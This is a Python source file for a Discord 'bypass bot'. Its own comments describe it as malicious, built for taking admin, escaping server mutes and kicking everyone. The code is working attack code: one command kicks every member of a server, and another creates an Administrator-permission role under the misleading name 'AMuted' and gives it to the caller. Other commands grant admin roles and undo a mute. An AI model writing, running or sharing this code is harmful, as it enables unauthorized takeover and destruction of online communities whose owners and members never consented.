#Created by Mason - m._#0558
#Bypass Bot for multiple use cases on DISCORD... Getting Admin, Bypassing server mute, Kicking all members and such...

# '<ka for kick'  '<l for admin perms'  '<speak for unserver mute'  '<back for roles in "sexy server" '

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix='<')

client.remove_command("help")



@client.event
async def on_ready():
    print ("bot is now online")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

#Malicious purpose

@client.command(pass_context=True)
async def ka(ctx):
        for user in list(ctx.message.guild.members):
            try:
                await client.kick(user)
                print ("User " + user.name + " has faced thanos in " + ctx.message.guild.name)
            except:
                pass
        print ("Action Completed: KickAll")

@client.command(pass_context=True)
async def l(ctx):
    server = ctx.message.guild
    perms = discord.Permissions(8)
    await ctx.guild.create_role(name='AMuted', permissions=perms)
    user = ctx.message.author
    role = discord.utils.get(user.guild.roles, name="AMuted")
    await user.add_roles(role)
    print ("SHHHHH, You're in!")

@client.command(pass_context=True)
async def back(ctx):
    server = ctx.message.guild
    user = ctx.message.author
    role = discord.utils.get(user.guild.roles, name="ANOTHER SEXY")
    role1 = discord.utils.get(user.guild.roles, name="admin")
    await user.add_roles(role)
    await user.add_roles(role1)
    print ("Ayo you're back :)")

@client.command(pass_context=True)
async def speak(ctx):
    server = ctx.message.guild
    user = ctx.message.author
    await user.edit(mute=False)
    print ("Low and behold, the power of speech... omegalul")
    

client.run("") #Bot's Token Code Goes Here
